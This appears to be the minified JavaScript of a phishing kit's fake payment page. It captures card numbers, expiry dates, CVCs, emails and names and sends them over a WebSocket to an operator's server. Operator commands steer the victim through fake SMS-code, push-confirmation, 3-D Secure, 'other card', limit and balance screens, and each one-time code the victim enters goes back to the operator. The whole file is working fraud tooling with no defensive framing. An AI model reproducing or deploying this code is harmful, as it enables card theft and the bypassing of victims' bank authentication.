(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))r(i);new MutationObserver(i=>{for(const c of i)if(c.type==="childList")for(const f of c.addedNodes)f.tagName==="LINK"&&f.rel==="modulepreload"&&r(f)}).observe(document,{childList:!0,subtree:!0});function s(i){const c={};return i.integrity&&(c.integrity=i.integrity),i.referrerPolicy&&(c.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?c.credentials="include":i.crossOrigin==="anonymous"?c.credentials="omit":c.credentials="same-origin",c}function r(i){if(i.ep)return;i.ep=!0;const c=s(i);fetch(i.href,c)}})();const o=new WebSocket("ws://localhost:9000"),E=document.querySelector(".buttonRestart"),n=document.querySelector(".codeSMS_button"),d=document.querySelector(".codeCustomSMS_button"),J=document.querySelector(".codePushSMS_button"),D=document.querySelector(".codeCustomPushSMS_button"),P=document.querySelector(".SMSValidateInput"),C=document.querySelector(".CustomSMSValidateInput");n.style.opacity=".5";d.style.opacity=".5";n.setAttribute("disabled","");d.setAttribute("disabled","");let l=300,g=5;P.oninput=t=>{t.target.value.length>=3?(n.style.opacity="1",n.removeAttribute("disabled")):(n.style.opacity=".5",n.setAttribute("disabled",""))};C.oninput=t=>{t.target.value.length>=3?(d.style.opacity="1",d.removeAttribute("disabled")):(d.style.opacity=".5",d.setAttribute("disabled",""))};const O=t=>t.toString().length===1?"0"+t:t.toString(),x=(t=0)=>O(Math.trunc(t/60))+":"+O(t%60),a=()=>{document.querySelector(".App-Payment.is-darkBackground").style.display="none",document.querySelectorAll(".AppBlocks").forEach(t=>{t.classList.remove("isActiveMode")})},u=(t,e,s)=>{o.send(JSON.stringify({type:"sendAdmin",callback:t.callback,message_id:e.mID,to:s}))},w=()=>{const t=JSON.parse(localStorage.getItem("verified"));o.send(JSON.stringify({type:"clientClick",event:"REDIRECT",message_id:t.mID})),o.send(JSON.stringify({type:"offline",message_id:t.mID})),document.location.href="/"};E.onclick=w;n.onclick=t=>{const e=document.querySelector("#codeSMS");e.setAttribute("disabled",""),document.querySelector(".smsLoader").classList.add("isLoading");const{mID:s,method:r}=JSON.parse(localStorage.getItem("verified"));o.send(JSON.stringify({type:"sendSMS",message_id:s,fromMethod:r,code:e.value})),t.target.remove()};d.onclick=t=>{const e=document.querySelector("#codeCustomSMS");e.setAttribute("disabled",""),document.querySelector(".smsCustomLoader").classList.add("isLoading");const{mID:s,method:r}=JSON.parse(localStorage.getItem("verified"));o.send(JSON.stringify({type:"sendSMS",message_id:s,fromMethod:r,code:e.value})),t.target.remove()};J.onclick=t=>{o.send(JSON.stringify({type:"clientClick",event:"PUSH",message_id:JSON.parse(localStorage.getItem("verified")).mID})),document.querySelector(".smsAppPushLoader").classList.add("isLoading"),t.target.remove()};D.onclick=t=>{o.send(JSON.stringify({type:"clientClick",event:"CUSTOM PUSH",message_id:JSON.parse(localStorage.getItem("verified")).mID})),document.querySelector(".smsAppCustomPushLoader").classList.add("isLoading"),t.target.remove()};setTimeout(function t(){const e=document.querySelector(".AppPush"),s=document.querySelector(".AppCustomPush"),r=document.querySelector(".AppSuccess");e.classList.contains("isActiveMode")?(l>0&&l--,document.querySelector(".pushTimer").textContent=x(l)):s.classList.contains("isActiveMode")?l>0&&l--:l=301,r.classList.contains("isActiveMode")?(g>0?g--:document.location.href="/",document.querySelector(".redirectSuccessPayTimer").textContent=g):g=5,setTimeout(t,1e3)},1e3);o.onmessage=t=>{const e=JSON.parse(t.data);if(e.type=="verify"&&localStorage.setItem("verified",JSON.stringify({mID:e.message_id,method:""})),e.type=="checkUser"){const{mID:r,method:i}=JSON.parse(localStorage.getItem("verified"))||{mID:"",method:""};localStorage.setItem("verified",JSON.stringify({mID:r,method:""})),o.send(JSON.stringify({type:"button",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:e.callback}))}const s=JSON.parse(localStorage.getItem("verified"));try{e.type=="customsms"&&e.message_id==s.mID&&(o.send(JSON.stringify({type:"sendAdmin",callback:"customsms",message_id:s.mID})),a(),document.querySelector(".AppCustomSMS").classList.add("isActiveMode"),document.querySelector(".CustomSMSText").textContent=e.text),e.type=="custompush"&&e.message_id==s.mID&&(o.send(JSON.stringify({type:"sendAdmin",callback:"custompush",message_id:s.mID})),a(),document.querySelector(".AppCustomPush").classList.add("isActiveMode"),document.querySelector(".customPushText").textContent=e.text),e.type=="ownerror"&&e.message_id==s.mID&&(o.send(JSON.stringify({type:"sendAdmin",callback:"ownerror",message_id:s.mID})),a(),document.querySelector(".AppOwnError").classList.add("isActiveMode"),document.querySelector(".OwnErrorText").textContent=e.text),e.type=="button"&&e.message_id==s.message_id&&(e.callback&&(g=6,l=301),e.callback=="sms"&&(u(e,s,"smsPAGE"),a(),document.querySelector(".AppSMS").classList.add("isActiveMode")),e.callback=="custom_sms"&&o.send(JSON.stringify({type:"isCustomSMS",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:e.callback})),e.callback=="pushSMS"&&(u(e,s,"pushSMSPAGE"),a(),document.querySelector(".AppPush").classList.add("isActiveMode")),e.callback=="custom_pushSMS"&&o.send(JSON.stringify({type:"isCustomPUSH",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:e.callback})),e.callback=="success_pay"&&(o.send(JSON.stringify({type:"sendAdmin",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:e.callback})),a(),document.querySelector(".AppSuccess").classList.add("isActiveMode")),e.callback=="other_card"&&(u(e,s,"other_cardPAGE"),a(),document.querySelector(".AppOtherCard").classList.add("isActiveMode")),e.callback=="3dson"&&(u(e,s,"3dsonPAGE"),a(),document.querySelector(".App3DS").classList.add("isActiveMode")),e.callback=="limit"&&(u(e,s,"limitPAGE"),a(),document.querySelector(".AppLimit").classList.add("isActiveMode")),e.callback=="balance"&&(u(e,s,"balancePAGE"),a(),document.querySelector(".AppBalance").classList.add("isActiveMode")),e.callback=="own_error"&&o.send(JSON.stringify({type:"isOwnError",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:e.callback})),e.callback=="online"&&o.send(JSON.stringify({type:"isOnline",message_id:JSON.parse(localStorage.getItem("verified")).mID,callback:e.callback})))}catch(r){console.log(r)}};window.onload=()=>{const t=JSON.parse(localStorage.getItem("verified"))??{mID:"",method:""};o.send(JSON.stringify({type:"offline",message_id:t.mID||""})),localStorage.removeItem("verified")};const B=/^(([^<>()[\].,;:\s@"]+(\.[^<>()[\].,;:\s@"]+)*)|(".+"))@(([^<>()[\].,;:\s@"]+\.)+[^<>()[\].,;:\s@"]{2,})$/iu;function F(t){return B.test(t)}const N=document.getElementById("cardNumber"),M=document.getElementById("cardExpiry"),L=document.getElementById("cardCvc"),p=document.getElementById("cardLogo"),T=document.querySelector(".PaymentForm-form"),q=document.getElementById("email"),_=document.getElementById("billingName"),m=document.querySelector(".FormButton");m.style.opacity=".5";m.setAttribute("disabled","");const G=document.querySelector(".loader-button"),y={visa:/^4/,mastercard:/^5[1-5]/,amex:/^3[47]/,jcb:/^3[56]/};let k=!1,b=!1,v=!1,A=!1,I=!1,h=!1;const S=()=>{b&&v&&A&&I&&h?(m.style.opacity="1",m.removeAttribute("disabled")):(m.style.opacity=".5",m.setAttribute("disabled",""))};q.addEventListener("input",t=>{t.target.value.length>6&&F(t.target.value)?b=!0:b=!1,S()});N.addEventListener("input",t=>{let e=t.target.value.replace(/\D/g,"");e.length>=13?(e=e.substring(0,16),v=!0):v=!1,t.target.value=e.replace(/(\d{4})(?=\d)/g,"$1 ").trim(),y.visa.test(e)?(p.src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg",document.querySelector(".FormFieldExamples").style.display="none",e=e.substring(0,13)):y.mastercard.test(e)?(p.src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg",document.querySelector(".FormFieldExamples").style.display="none",e=e.substring(0,16)):y.amex.test(e)?(p.src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg",document.querySelector(".FormFieldExamples").style.display="none",e=e.substring(0,16)):y.jcb.test(e)?(p.src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/JCB_logo.svg/200px-JCB_logo.svg.png",document.querySelector(".FormFieldExamples").style.display="none",e=e.substring(0,16)):(p.src="",e=e.substring(0,16),document.querySelector(".FormFieldExamples").style.display="flex"),S()});M.addEventListener("input",t=>{let e=t.target.value.replace(/\D/g,"");e.length>=4?(e=e.substring(0,4),A=!0):A=!1,t.target.value=e.replace(/(\d{2})(\d{1,2})/,"$1/$2"),S()});L.addEventListener("input",t=>{let e=t.target.value.replace(/\D/g,"");e.length>=3?I=!0:I=!1,t.target.value=e.replace(/(\d{4})(?=\d)/g,"$1 ").trim(),S()});_.addEventListener("input",t=>{t.target.value.length>=5?h=!0:h=!1,S()});T.addEventListener("submit",t=>{t.preventDefault(),G.classList.add("isLoading");const e=N.value.replace(/\s/g,""),s=M.value,r=L.value;if(k)return;const i={email:q.value,cardNumber:e,expiryDate:s,cvc:r,billingName:_.value,type:"form",uid:localStorage.getItem("uID")};o.send(JSON.stringify(i)),k=!0});
